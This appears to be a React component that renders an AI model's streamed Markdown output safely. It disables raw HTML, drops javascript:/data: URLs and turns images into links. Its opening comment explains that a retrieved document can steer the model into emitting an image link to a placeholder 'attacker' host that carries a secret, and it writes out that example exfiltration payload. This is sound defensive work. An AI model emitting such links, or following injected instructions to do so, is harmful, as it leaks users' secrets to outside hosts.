// Model output is untrusted (a retrieved document can steer what it repeats). Two properties, tested in Markdown.test.tsx, hold while it
// streams as much as after:
//   * raw HTML is never parsed: react-markdown has no raw-HTML plugin here, and `javascript:`/`data:` URLs are dropped by its default;
//   * nothing is fetched without a click: an image is shown as a link. `![x](https://attacker/?d=<secret>)` would otherwise send the
//     secret the moment the answer rendered.
import { memo, type ReactNode } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkBreaks from "remark-breaks";
import remarkGfm from "remark-gfm";
import remend from "remend";
import { CodeBlock } from "./CodeBlock";
import { fadeInWords } from "./fadeInWords";

const external = { target: "_blank", rel: "noopener noreferrer" };

/** An address react-markdown refused (`javascript:`, `data:`, an unfinished image's placeholder) arrives empty: text, not a link. */
const link = (href: unknown, children: ReactNode) =>
  typeof href === "string" && href ? (
    <a href={href} {...external}>
      {children}
    </a>
  ) : (
    <span>{children}</span>
  );

// Module level on purpose: a new object on each render would rebuild every element, and replay every fade.
const components: Components = {
  a: ({ href, children }) => link(href, children),
  img: ({ src, alt }) => link(src, alt || "image"),
  pre: ({ node, children }) => {
    const code = node?.children[0];
    const names = code?.type === "element" ? code.properties["className"] : undefined;
    const first = Array.isArray(names) ? names[0] : undefined;
    const language = typeof first === "string" ? first.replace(/^language-/, "") : "";
    return <CodeBlock language={language}>{children}</CodeBlock>;
  },
};

const remarkPlugins = [remarkGfm, remarkBreaks];
const fading = [fadeInWords];

/** Closes what the model has not finished writing, so a half-typed `**bold` does not flash its asterisks. A link still being typed is
 *  shown as its text alone: a cut-off address is not one to click. No maths here, so `$$` is left as written. */
const closeOpenSyntax = (text: string) => remend(text, { linkMode: "text-only", katex: false });

interface Props {
  text: string;
  /** The text is still arriving. */
  streaming?: boolean;
  /** Fade in words as they appear. Stays on after the stream ends: turning it off would rebuild what is on screen. */
  animate?: boolean;
}

// Memoised: each token re-renders the transcript, and every other message would otherwise be parsed again.
export const Markdown = memo(function Markdown({ text, streaming = false, animate = false }: Props) {
  return (
    <ReactMarkdown remarkPlugins={remarkPlugins} rehypePlugins={animate ? fading : []} components={components}>
      {streaming ? closeOpenSyntax(text) : text}
    </ReactMarkdown>
  );
});
